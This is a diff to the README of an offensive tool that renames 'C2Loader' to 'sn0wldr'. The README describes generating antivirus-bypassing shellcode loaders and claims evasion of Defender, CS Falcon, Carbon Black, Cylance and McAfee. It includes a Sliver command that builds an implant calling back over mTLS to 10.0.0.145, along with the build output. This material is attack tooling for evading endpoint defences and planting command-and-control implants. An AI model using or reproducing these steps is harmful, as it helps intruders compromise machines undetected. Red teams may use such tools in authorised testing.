@@ -1,6 +1,6 @@
-# C2Loader
+# sn0wldr
 
-## This is used to generate a AV bypassed C2 loader from shellcode.
+## This is used to generate a AV bypassed sc loader.
 
 up to test day, most common AVs can be bypassed: Windows defender, ATP, CS Falcon, Carbon Black, Red Canary, Cylance and McAfee.
 
@@ -35,11 +35,11 @@ sudo apt-get install mono-complete
 For Sliver:
 ```
 ### To Generate a Sliver implant shellcode without obfuscation:
-# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/c2loader/input/
+# [server] sliver > generate -N sliver --mtls 10.0.0.145 -b 10.0.0.145 --skip-symbols -f shellcode --save /root/Codes/sn0wldr/input/
 # [*] Generating new windows/amd64 implant binary
 # [!] Symbol obfuscation is disabled
 # [*] Build completed in 00:01:25
-# [*] Implant saved to /root/Codes/c2loader/input/sliver.bin
+# [*] Implant saved to /root/Codes/sn0wldr/input/sliver.bin
 #
 ### Move the sliver.bin to folder input if required, then run the autogen script.
 ```
